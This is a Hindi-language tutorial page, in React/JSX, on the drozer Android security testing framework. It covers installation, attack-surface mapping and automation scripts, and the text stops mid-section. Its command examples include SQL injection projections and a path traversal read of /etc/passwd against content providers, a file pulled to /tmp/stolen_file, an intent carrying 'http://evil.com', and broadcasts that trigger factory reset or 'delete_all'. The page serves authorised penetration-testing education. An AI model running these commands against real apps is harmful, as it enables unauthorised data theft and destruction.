import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Drozer() {
  return (
    <TutorialLayout
      title="drozer"
      subtitle="Android सिक्योरिटी टेस्टिंग फ्रेमवर्क — एप अटैक सर्फ़ेस एनालिसिस"
      icon="🤖"
      prev={{ to: '/tool/sslstrip', label: 'sslstrip' }}
      next={{ to: '/tool/chisel', label: 'chisel' }}
    >
      <h2>What is Drozer?</h2>
      <p>
        Drozer एक शक्तिशाली Android सिक्योरिटी टेस्टिंग फ्रेमवर्क है जो Android एप्लिकेशन के अटैक सर्फ़ेस को असेस करता है। यह टूल एक्टिविटीज़, सर्विसेज़, ब्रॉडकास्ट रिसीवर्स, और कंटेंट प्रोवाइडर्स जैसे एप कंपोनेंट्स को टेस्ट कर सकता है। Drozer Android के IPC (इंटर-प्रोसेस कम्युनिकेशन) मैकेनिज़्म का फायदा उठाकर एप के अंदर तक पहुंच बनाता है।
      </p>
      <p>
        Drozer क्लाइंट-सर्वर आर्किटेक्चर पर काम करता है। एक एजेंट APK Android डिवाइस पर इंस्टॉल होता है और एक कंसोल अटैकर की मशीन पर चलता है। एजेंट डिवाइस पर एक एम्बेडेड सर्वर चलाता है जो ADB या नेटवर्क के ज़रिए कंसोल से कनेक्ट होता है। कनेक्शन के बाद अटैकर drozer के मॉड्यूल्स यूज़ करके डिवाइस पर इंस्टॉल्ड एप्स को टेस्ट कर सकता है।
      </p>
      <p>
        Drozer को WithSecure (पहले F-Secure) ने डेवेलप किया है। यह मोबाइल पेनेट्रेशन टेस्टिंग का इंडस्ट्री स्टैंडर्ड टूल है। OWASP मोबाइल टॉप 10 के ज़्यादातर वल्नरेबिलिटीज़ इससे टेस्ट किए जा सकते हैं — इंप्रॉपर प्लेटफ़ॉर्म यूज़, इंसिक्योर डेटा स्टोरेज, इंसिक्योर कम्युनिकेशन सब।
      </p>
      <p>
        Drozer का सबसे बड़ा फ़ायदा यह है कि यह बिना रूट के भी काम करता है। ज़्यादातर Android सिक्योरिटी टूल्स को रूटेड डिवाइस चाहिए, लेकिन Drozer सिर्फ एजेंट APK इंस्टॉल करके चलता है। यह Android के built-in IPC मैकेनिज़्म का फायदा उठाता है — Intent, Binder, और Content Provider interfaces के ज़रिए एप के अंदर तक पहुंचता है। पेनेट्रेशन टेस्टर्स और मोबाइल सिक्योरिटी रिसर्चर्स के लिए यह must-have टूल है।
      </p>
      <p>
        Drozer में 200+ built-in मॉड्यूल्स हैं जो अलग-अलग तरह के टेस्ट परफॉर्म करते हैं — एन्यूमरेशन, एक्सप्लॉइटेशन, फ़ज़िंग, डेटा एक्सफ़िल्ट्रेशन, और बहुत कुछ। कस्टम मॉड्यूल्स Python में लिखे जा सकते हैं। यह काली लिनक्स और पैरोट ओएस में प्री-इंस्टॉल्ड आता है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Drozer केवल अधिकृत पेनेट्रेशन टेस्टिंग और सिक्योरिटी रिसर्च के लिए इस्तेमाल करें। बिना अनुमति के एप्लिकेशन एनालिसिस अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत एप मॉडिफिकेशन और डेटा एक्सेस अपराध हो सकता है।
      </div>

      <h2>History of Drozer</h2>
      <p>
        Drozer को 2012 में F-Secure (अब WithSecure) की सिक्योरिटी टीम ने बनाया था। इसका पहले नाम "dz" था। यह Android के बढ़ते इकोसिस्टम के साथ मोबाइल सिक्योरिटी टेस्टिंग की ज़रूरत को पूरा करने के लिए बनाया गया था। उस समय Android एप सिक्योरिटी टेस्टिंग के लिए कोई comprehensive टूल नहीं था — Drozer ने यह gap भरा।
      </p>
      <p>
        2014 में इसे ओपन सोर्स कर दिया गया और GitHub पर रिलीज़ किया गया। तब से यह Android पेनेट्रेशन टेस्टिंग का डी-फैक्टो टूल बन गया है। WithSecure इसे एक्टिवली मेंटेन करता है और नए Android वर्जन्स के साथ अपडेट करता है। GitHub पर इसके 3,000+ स्टार्स हैं।
      </p>
      <p>
        Drozer का डिज़ाइन दर्शन यह है कि Android एप्स के IPC कम्युनिकेशन को टेस्ट करना आसान होना चाहिए। Android का IPC सिस्टम (Intent, Binder, Content Provider) बहुत पावरफुल है लेकिन गलत कॉन्फ़िगरेशन से खतरनाक भी हो सकता है। Drozer इन्हीं कमज़ोरियों को ढूंढता है — exported components, unprotected Content Providers, implicit Intent hijacking सब।
      </p>

      <h2>How Drozer Works?</h2>
      <p>
        Drozer Android के बिल्ट-इन IPC मैकेनिज़्म का इस्तेमाल करता है एप कंपोनेंट्स के साथ इंटरैक्ट करने के लिए:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">एजेंट APK:</strong> डिवाइस पर इंस्टॉल होता है और एम्बेडेड सर्वर चलाता है जो कंसोल के कमांड्स रिसीव करता है</li>
        <li><strong className="text-white">कंसोल:</strong> अटैकर की मशीन पर चलता है और drozer मॉड्यूल्स एक्ज़ीक्यूट करता है</li>
        <li><strong className="text-white">ADB फॉरवार्डिंग:</strong> USB कनेक्शन के ज़रिए पोर्ट 31415 फॉरवर्ड करके कम्युनिकेशन होता है</li>
        <li><strong className="text-white">IPC ब्रिज:</strong> drozer Android के Intent, Binder, और Content Provider इंटरफ़ेसेज़ के ज़रिए एप कंपोनेंट्स से बात करता है</li>
        <li><strong className="text-white">मॉड्यूल सिस्टम:</strong> Python में लिखे गए मॉड्यूल्स अलग-अलग टेस्ट परफॉर्म करते हैं — एन्यूमरेशन, एक्सप्लॉइटेशन, फ़ज़िंग</li>
        <li><strong className="text-white">ADB WiFi:</strong> USB के बिना WiFi के ज़रिए भी कनेक्ट कर सकते हो (adb tcpip 5555)</li>
        <li><strong className="text-white">SSL/TLS कम्युनिकेशन:</strong> कंसोल और एजेंट के बीच encrypted कम्युनिकेशन</li>
        <li><strong className="text-white">मल्टी-डिवाइस:</strong> एक कंसोल से कई डिवाइसेज़ कनेक्ट कर सकते हो</li>
      </ul>

      <h2>Installation</h2>
      <p>
        Drozer इंस्टॉल करने के लिए PC और Android डिवाइस दोनों पर सेटअप चाहिए। PC पर कंसोल चलता है और डिवाइस पर एजेंट APK।
      </p>
      <CodeBlock
        title="Drozer इंस्टॉलेशन"
        code={`# PC पर drozer कंसोल इंस्टॉल करें:
pip3 install drozer

# अगर Python 3.10+ है तो:
pip3 install drozer --ignore-installed protobuf

# Android डिवाइस पर एजेंट APK इंस्टॉल करें:
# GitHub releases से APK डाउनलोड करें:
# https://github.com/WithSecureLabs/drozer/releases
adb install drozer-agent.apk

# डिवाइस पर drozer एजेंट खोलें → "Embedded Server" → Start

# USB कनेक्शन सेटअप:
adb forward tcp:31415 tcp:31415

# कंसोल कनेक्ट करें:
drozer console connect

# WiFi कनेक्शन (USB के बिना):
adb tcpip 5555
adb connect 192.168.1.100:5555
drozer console connect --server 192.168.1.100

# वर्जन चेक:
drozer version

# सभी मॉड्यूल्स देखें:
drozer console connect
dz> list`}
      />

      <h2>Basic Usage</h2>
      <p>
        Drozer कंसोल में कनेक्ट होने के बाद मॉड्यूल्स यूज़ करके एप टेस्टिंग शुरू कर सकते हो। हर मॉड्यूल एक specific टेस्ट परफॉर्म करता है।
      </p>
      <CodeBlock
        title="बेसिक कमांड्स"
        code={`# कंसोल कनेक्ट:
drozer console connect

# सभी मॉड्यूल्स की लिस्ट:
dz> list

# स्पेसिफिक मॉड्यूल की हेल्प:
dz> help app.package.list

# इंस्टॉल्ड एप्स की लिस्ट:
dz> run app.package.list

# टार्गेट एप की इन्फॉर्मेशन:
dz> run app.package.info -a com.target.app

# अटैक सर्फ़ेस एनालिसिस:
dz> run app.package.attacksurface com.target.app

# फ़िल्टर — "bank" वाले एप्स:
dz> run app.package.list | grep -i bank

# डिबगेबल एप्स ढूंढें:
dz> run scanner.misc.finddebuggable

# एप का मैनिफ़ेस्ट देखें:
dz> run app.package.manifest com.target.app`}
      />

      <h2>Important Commands</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.package.list</td><td className="py-2 px-3">सभी इंस्टॉल्ड एप्स की लिस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.package.info -a pkg</td><td className="py-2 px-3">स्पेसिफिक एप की डिटेल इन्फॉर्मेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.package.attacksurface pkg</td><td className="py-2 px-3">अटैक सर्फ़ेस — एक्सपोर्टेड कंपोनेंट्स दिखाता है</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.activity.info -a pkg</td><td className="py-2 px-3">एक्टिविटीज़ की लिस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.provider.info -a pkg</td><td className="py-2 px-3">कंटेंट प्रोवाइडर्स की लिस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.service.info -a pkg</td><td className="py-2 px-3">सर्विसेज़ की लिस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.broadcast.info -a pkg</td><td className="py-2 px-3">ब्रॉडकास्ट रिसीवर्स की लिस्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.provider.query uri</td><td className="py-2 px-3">कंटेंट प्रोवाइडर क्वेरी</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run scanner.provider.finduris -a pkg</td><td className="py-2 px-3">एक्सेसिबल URI ढूंढें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run scanner.provider.injection -a pkg</td><td className="py-2 px-3">SQL इंजेक्शन स्कैन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run scanner.provider.traversal -a pkg</td><td className="py-2 px-3">पाथ ट्रैवर्सल स्कैन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.activity.start --component pkg cls</td><td className="py-2 px-3">एक्टिविटी स्टार्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.broadcast.send --action act</td><td className="py-2 px-3">ब्रॉडकास्ट भेजें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono text-xs">run app.service.start --component pkg cls</td><td className="py-2 px-3">सर्विस स्टार्ट करें</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono text-xs">run shell.exec command</td><td className="py-2 px-3">शेल कमांड एक्ज़ीक्यूट</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Information Gathering</h2>
      <p>
        Drozer से एप के बारे में बहुत सारी इन्फॉर्मेशन निकाल सकते हो — परमिशंस, कंपोनेंट्स, डेटा स्टोरेज सब। यह reconnaissance phase सबसे important है — जितना ज़्यादा पता होगा, उतना अच्छा attack होगा।
      </p>
      <CodeBlock
        title="इन्फॉर्मेशन गैदरिंग"
        code={`# एप की परमिशंस:
dz> run app.package.info -a com.target.app
# Permissions:
#   android.permission.INTERNET
#   android.permission.READ_CONTACTS
#   android.permission.WRITE_EXTERNAL_STORAGE
#   android.permission.READ_SMS

# डिटेल्ड पैकेज इन्फो (manifest पार्स):
dz> run app.package.manifest com.target.app

# सभी एप्स की परमिशंस:
dz> run app.package.list -p

# एप का डेटा डायरेक्ट्री:
dz> run app.package.backup -f /tmp/app_backup.ab com.target.app

# डिबगेबल एप्स ढूंढें:
dz> run app.package.debuggable -a com.target.app
dz> run scanner.misc.finddebuggable

# एप का डेटा बैकअप:
dz> run app.package.backup -f /tmp/backup.ab com.target.app

# मैनिफ़ेस्ट में exported=true वाले कंपोनेंट्स:
dz> run app.package.manifest com.target.app | grep exported`}
      />

      <h2>Attack Surface Mapping</h2>
      <p>
        अटैक सर्फ़ेस मैपिंग सबसे इम्पोर्टेंट स्टेप है — यह बताता है कि एप के कौन से कंपोनेंट्स एक्सेसिबल हैं। हर exported कंपोनेंट एक potential attack vector है।
      </p>
      <CodeBlock
        title="अटैक सर्फ़ेस"
        code={`# अटैक सर्फ़ेस एनालिसिस:
dz> run app.package.attacksurface com.target.app

# आउटपुट:
# Attack Surface:
#   3 activities exported    ← एक्सपोर्टेड एक्टिविटीज़
#   1 broadcast receivers exported
#   1 content providers exported
#   0 services exported
#   is debuggable            ← डिबगेबल है?
#   2 content providers with SQL injection possible
#   1 content providers with path traversal possible

# हर कंपोनेंट को अलग से टेस्ट करो:
# एक्टिविटीज़:
dz> run app.activity.info -a com.target.app

# कंटेंट प्रोवाइडर्स:
dz> run app.provider.info -a com.target.app

# सर्विसेज़:
dz> run app.service.info -a com.target.app

# ब्रॉडकास्ट रिसीवर्स:
dz> run app.broadcast.info -a com.target.app

# एक्सपोर्टेड कंपोनेंट्स की संख्या जितनी ज़्यादा,
# उतना बड़ा अटैक सर्फ़ेस — ज़्यादा vulnerability के chances`}
      />

      <h2>Content Provider Exploitation</h2>
      <p>
        कंटेंट प्रोवाइडर्स Android एप्स का सबसे कॉमन अटैक वेक्टर हैं। गलत कॉन्फ़िगरेशन से डेटा लीक, SQL इंजेक्शन, और फ़ाइल एक्सेस संभव है। Content Providers Android का database access layer है — अगर unprotected है तो कोई भी data read/write कर सकता है।
      </p>
      <CodeBlock
        title="कंटेंट प्रोवाइडर एक्सप्लॉइटेशन"
        code={`# कंटेंट प्रोवाइडर्स की लिस्ट:
dz> run app.provider.info -a com.target.app

# URI परमिशंस चेक करें:
dz> run scanner.provider.finduris -a com.target.app

# कंटेंट प्रोवाइडर क्वेरी:
dz> run app.provider.query content://com.target.app.provider/users

# सभी columns देखें:
dz> run app.provider.query content://com.target.app.provider/users --projection "*"

# SQL इंजेक्शन टेस्ट:
dz> run app.provider.query content://com.target.app.provider/users --projection "* FROM users--"

# UNION-बेस्ड SQL इंजेक्शन:
dz> run app.provider.query content://com.target.app.provider/users --projection "* FROM sqlite_master WHERE type='table'--"

# टेबल नेम्स निकालें:
dz> run app.provider.query content://com.target.app.provider/users --projection "* FROM sqlite_master--"

# पाथ ट्रैवर्सल:
dz> run app.provider.read content://com.target.app.provider/../../../etc/passwd

# फ़ाइल डाउनलोड:
dz> run app.provider.download content://com.target.app.provider/file /tmp/stolen_file

# SQL इंजेक्शन स्कैनर:
dz> run scanner.provider.injection -a com.target.app

# पाथ ट्रैवर्सल स्कैनर:
dz> run scanner.provider.traversal -a com.target.app`}
      />

      <h2>Activity Testing</h2>
      <p>
        एक्टिविटीज़ Android एप के UI कंपोनेंट्स हैं। एक्सपोर्टेड एक्टिविटीज़ को बिना परमिशन के स्टार्ट किया जा सकता है — यह बहुत dangerous हो सकता है अगर admin panel या settings activity exported हो।
      </p>
      <CodeBlock
        title="एक्टिविटी टेस्टिंग"
        code={`# एक्सपोर्टेड एक्टिविटीज़:
dz> run app.activity.info -a com.target.app

# एक्टिविटी स्टार्ट करें:
dz> run app.activity.start --component com.target.app com.target.app.MainActivity

# सीक्रेट एक्टिविटी एक्सेस करें (अगर एक्सपोर्टेड है):
dz> run app.activity.start --component com.target.app com.target.app.AdminActivity

# इंटेंट के साथ डेटा भेजें:
dz> run app.activity.start --component com.target.app com.target.app.DeepLinkActivity --extra-string url "http://evil.com"

# एक्टिविटी ब्रूटफोर्स:
dz> run scanner.activity.browsable -a com.target.app

# कस्टम इंटेंट भेजें:
dz> run app.activity.start --component com.target.app com.target.app.ShareActivity --extra-string text "malicious data"

# बैक स्टैक मैनिपुलेशन:
dz> run app.activity.start --component com.target.app com.target.app.ResetPasswordActivity --extra-string email "admin@target.com"`}
      />

      <h2>Broadcast Receiver Testing</h2>
      <p>
        ब्रॉडकास्ट रिसीवर्स Android के मैसेजिंग सिस्टम हैं। एक्सपोर्टेड रिसीवर्स को मैलिशियस इंटेंट्स भेजे जा सकते हैं — password reset, data wipe, या unauthorized actions trigger किए जा सकते हैं।
      </p>
      <CodeBlock
        title="ब्रॉडकास्ट रिसीवर टेस्टिंग"
        code={`# एक्सपोर्टेड रिसीवर्स:
dz> run app.broadcast.info -a com.target.app

# ब्रॉडकास्ट भेजें:
dz> run app.broadcast.send --action com.target.app.SECRET_ACTION

# एक्स्ट्रा डेटा के साथ:
dz> run app.broadcast.send --action com.target.app.SECRET_ACTION --extra-string key "malicious_value"

# ब्रॉडकास्ट रिसीवर इंटरसेप्ट:
dz> run app.broadcast.sniff --action android.intent.action.BOOT_COMPLETED

# SMS रिसीवर टेस्ट:
dz> run app.broadcast.send --action android.provider.Telephony.SMS_RECEIVED --extra-string message "malicious sms"

# डेटा वाइप ब्रॉडकास्ट:
dz> run app.broadcast.send --action com.target.app.FACTORY_RESET

# कस्टम ब्रॉडकास्ट:
dz> run app.broadcast.send --action com.target.app.ADMIN_COMMAND --extra-string cmd "delete_all"`}
      />

      <h2>Service Testing</h2>
      <p>
        सर्विसेज़ background में चलने वाले कंपोनेंट्स हैं। एक्सपोर्टेड सर्विसेज़ को unauthorized तरीके से स्टार्ट या मैनिपुलेट किया जा सकता है।
      </p>
      <CodeBlock
        title="सर्विस टेस्टिंग"
        code={`# एक्सपोर्टेड सर्विसेज़:
dz> run app.service.info -a com.target.app

# सर्विस स्टार्ट करें:
dz> run app.service.start --component com.target.app com.target.app.SyncService

# सर्विस अटैक — डेटा इंजेक्शन:
dz> run app.service.send com.target.app com.target.app.SyncService --msg 1 1 1 --extra-string data "malicious"

# सर्विस ब्रूटफोर्स:
dz> run scanner.service.info -a com.target.app

# मैसेज भेजें:
dz> run app.service.send com.target.app com.target.app.BackgroundService --msg 2 1 1 --extra-string command "exfiltrate"`}
      />

      <h2>OWASP Mobile Top 10 Coverage</h2>
      <p>
        Drozer OWASP Mobile Top 10 (2024) के ज़्यादातर वल्नरेबिलिटीज़ को कवर करता है:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">OWASP Category</th>
              <th className="text-left py-2 px-3 text-neon-green">Drozer Coverage</th>
              <th className="text-left py-2 px-3 text-neon-green">मॉड्यूल</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M1: Improper Credential Usage</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3 font-mono text-xs">app.provider.query, shell.exec</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M2: Insecure Data Storage</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3 font-mono text-xs">app.provider.read, app.package.backup</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M3: Insecure Communication</td><td className="py-2 px-3">आंशिक</td><td className="py-2 px-3 font-mono text-xs">shell.exec (netstat)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M4: Insecure Authentication</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3 font-mono text-xs">app.activity.start</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M5: Insufficient Cryptography</td><td className="py-2 px-3">आंशिक</td><td className="py-2 px-3 font-mono text-xs">app.provider.read (DB files)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M7: Client Code Quality</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3 font-mono text-xs">scanner.provider.injection</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">M8: Code Tampering</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3 font-mono text-xs">app.package.debuggable</td></tr>
            <tr><td className="py-2 px-3 text-white">M9: Reverse Engineering</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3 font-mono text-xs">app.package.manifest</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <p>
        Drozer मॉड्यूल्स Python में लिखे जाते हैं और कस्टम मॉड्यूल्स बनाए जा सकते हैं। यह automation के लिए बहुत useful है — repetitive tasks automate कर सकते हो।
      </p>
      <CodeBlock
        title="कस्टम मॉड्यूल"
        code={`# कस्टम मॉड्यूल बनाएं (Python):
# ~/.drozer_modules/custom/android_audit.py

from drozer import Module

class AndroidAudit(Module):
    name = "Android Audit Module"
    description = "Comprehensive Android app audit"
    author = "Security Tester"
    date = "2024-01-15"
    license = "BSD (3-clause)"
    path = "custom"

    def execute(self, arguments):
        package = arguments.get(0)

        # अटैक सर्फ़ेस चेक:
        self.stdout.write("[+] Attack Surface:\\n")
        self.execute("run app.package.attacksurface %s" % package)

        # एक्टिविटीज़:
        self.stdout.write("[+] Exported Activities:\\n")
        self.execute("run app.activity.info -a %s" % package)

        # प्रोवाइडर्स:
        self.stdout.write("[+] Content Providers:\\n")
        self.execute("run app.provider.info -a %s" % package)

        # URI स्कैन:
        self.stdout.write("[+] Accessible URIs:\\n")
        self.execute("run scanner.provider.finduris -a %s" % package)

        # SQL इंजेक्शन:
        self.stdout.write("[+] SQL Injection:\\n")
        self.execute("run scanner.provider.injection -a %s" % package)

# यूज़:
dz> run custom.android_audit com.target.app`}
      />

      <CodeBlock
        title="बैश ऑटोमेशन स्क्रिप्ट"
        code={`#!/bin/bash
# Drozer ऑटोमेशन — बल्क एप टेस्टिंग

TARGET_PKG="com.target.app"
REPORT="/tmp/drozer_report.txt"

echo "[+] Drozer Audit Started: $TARGET_PKG" > $REPORT
echo "[+] Date: $(date)" >> $REPORT

# अटैक सर्फ़ेस:
echo -e "\\n[+] Attack Surface:" >> $REPORT
echo "run app.package.attacksurface $TARGET_PKG" | drozer console connect >> $REPORT

# एक्टिविटीज़:
echo -e "\\n[+] Activities:" >> $REPORT
echo "run app.activity.info -a $TARGET_PKG" | drozer console connect >> $REPORT

# URI स्कैन:
echo -e "\\n[+] URIs:" >> $REPORT
echo "run scanner.provider.finduris -a $TARGET_PKG" | drozer console connect >> $REPORT

# SQL इंजेक्शन:
echo -e "\\n[+] SQL Injection:" >> $REPORT
echo "run scanner.provider.injection -a $TARGET_PKG" | drozer console connect >> $REPORT

# पाथ ट्रैवर्सल:
echo -e "\\n[+] Path Traversal:" >> $REPORT
echo "run scanner.provider.traversal -a $TARGET_PKG" | drozer console connect >> $REPORT

# डिबगेबल चेक:
echo -e "\\n[+] Debuggable:" >> $REPORT
echo "run app.package.debuggable -a $TARGET_PKG" | drozer console connect >> $REPORT

echo "[+] Report saved: $REPORT"
cat $REPORT`}
      />

      <CodeBlock
        title="Python ऑटोमेशन स्क्रिप्ट"
        code={`#!/usr/bin/env python3
# Drozer Python wrapper — ऑटोमेटेड ऑडिट

import subprocess
import sys

def run_drozer(module, args=""):
    """drozer कमांड रन करें"""
    cmd = f'echo "run {module} {args}" | drozer console connect'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

def audit_app(package):
    """पूरा एप ऑडिट"""
    print(f"[+] Auditing: {package}")

    # अटैक सर्फ़ेस:
    print("[+] Attack Surface:")
    print(run_drozer("app.package.attacksurface", package))

    # एक्टिविटीज़:
    print("[+] Activities:")
    print(run_drozer("app.activity.info", f"-a {package}"))

    # प्रोवाइडर्स:
    print("[+] Content Providers:")
    print(run_drozer("app.provider.info", f"-a {package}"))

    # URI स्कैन:
    print("[+] URIs:")
    print(run_drozer("scanner.provider.finduris", f"-a {package}"))

    # SQL इंजेक्शन:
    print("[+] SQL Injection:")
    print(run_drozer("scanner.provider.injection", f"-a {package}"))

if __name__ == "__main__":
    pkg = sys.argv[1] if len(sys.argv) > 1 else "com.target.app"
    audit_app(pkg)`}
      />

      <h2>Drozer vs Frida vs AppUse vs QARK</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Drozer</th>
              <th className="text-left py-2 px-3 text-neon-green">Frida</th>
              <th className="text-left py-2 px-3 text-neon-green">MobSF</th>
              <th className="text-left py-2 px-3 text-neon-green">QARK</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">टाइप</td><td className="py-2 px-3">IPC टेस्टिंग</td><td className="py-2 px-3">रनटाइम हुकिंग</td><td className="py-2 px-3">स्टैटिक + डायनामिक</td><td className="py-2 px-3">स्टैटिक एनालिसिस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">रूट चाहिए?</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (Gadget: नहीं)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">एक्सप्लॉइटेशन</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">लिमिटेड</td><td className="py-2 px-3">नहीं (सिर्फ डिटेक्शन)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">रनटाइम मॉडिफिकेशन</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">स्क्रिप्टिंग</td><td className="py-2 px-3">Python मॉड्यूल्स</td><td className="py-2 px-3">JavaScript</td><td className="py-2 px-3">REST API</td><td className="py-2 px-3">Python CLI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">IPC टेस्टिंग</td><td className="py-2 px-3">बेस्ट</td><td className="py-2 px-3">लिमिटेड</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Web UI</td><td className="py-2 px-3">नहीं (CLI)</td><td className="py-2 px-3">नहीं (CLI)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कम्युनिटी</td><td className="py-2 px-3">एक्टिव</td><td className="py-2 px-3">बहुत एक्टिव</td><td className="py-2 px-3">बहुत एक्टिव</td><td className="py-2 px-3">मेंटेन्ड नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कीमत</td><td className="py-2 px-3">फ्री</td><td className="py-2 px-3">फ्री</td><td className="py-2 px-3">फ्री</td><td className="py-2 px-3">फ्री</td></tr>
            <tr><td className="py-2 px-3 text-white">लर्निंग कर्व</td><td className="py-2 px-3">मीडियम</td><td className="py-2 px-3">स्टीप</td><td className="py-2 px-3">आसान</td><td className="py-2 px-3">आसान</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'drozer कनेक्ट नहीं हो रहा', a: 'ADB फॉरवार्डिंग चेक करो: adb forward tcp:31415 tcp:31415। एजेंट डिवाइस पर रनिंग होना चाहिए — "Embedded Server" → "Start"। फ़ायरवॉल पोर्ट 31415 ब्लॉक न करे। USB debugging एनेबल होना चाहिए।' },
          { q: 'Python version error आ रहा है', a: 'Python 3.10+ में protobuf कॉन्फ्लिक्ट होता है। pip3 install drozer --ignore-installed protobuf से इंस्टॉल करो। Virtual environment use करो: python3 -m venv drozer-env && source drozer-env/bin/activate && pip install drozer' },
          { q: 'एजेंट APK इंस्टॉल नहीं हो रहा', a: 'Unknown Sources एनेबल करो सेटिंग्स में। Android 11+ में "Install unknown apps" परमिशन दो। USB debugging एनेबल होना चाहिए। adb install -r drozer-agent.apk try करो (-r = reinstall)।' },
          { q: 'Content Provider query fails हो रही है', a: 'URI सही है या चेक करो — scanner.provider.finduris से URI ढूंढो। परमिशंस चेक करो — कुछ प्रोवाइडर्स को परमिशन चाहिए। content:// scheme सही है verify करो।' },
          { q: 'बहुत स्लो चल रहा है', a: 'ADB WiFi कनेक्शन USB से स्लो होता है। USB कनेक्शन यूज़ करो। बड़े एप्स में attacksurface स्कैन टाइम लेता है — धैर्य रखो। एक समय में एक ही मॉड्यूल रन करो।' },
          { q: 'मॉड्यूल not found error', a: 'drozer module index रिबिल्ड करो: dz> module index.create। Custom module path check करो ~/.drozer_modules/ में। drozer version update करो।' },
          { q: 'WiFi से कनेक्ट नहीं हो रहा', a: 'पहले USB से adb tcpip 5555 करो। फिर adb connect <device_ip>:5555। दोनों devices same WiFi network पर हों। Firewall port 5555 open होना चाहिए।' },
          { q: 'Android 13/14 पर issues आ रहे हैं', a: 'Latest drozer release use करो — GitHub से download करो। कुछ पुराने मॉड्यूल्स नए Android पर काम नहीं करते — drozer को update करो। Target SDK 33+ restrictions check करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Android Security Testing Methodology</h2>
      <p>
        Drozer-based Android security testing एक systematic methodology follow करनी चाहिए। हर step important है — skip करोगे तो vulnerabilities miss हो सकती हैं। यह methodology OWASP MASTG (Mobile Application Security Testing Guide) पर based है।
      </p>
      <p>
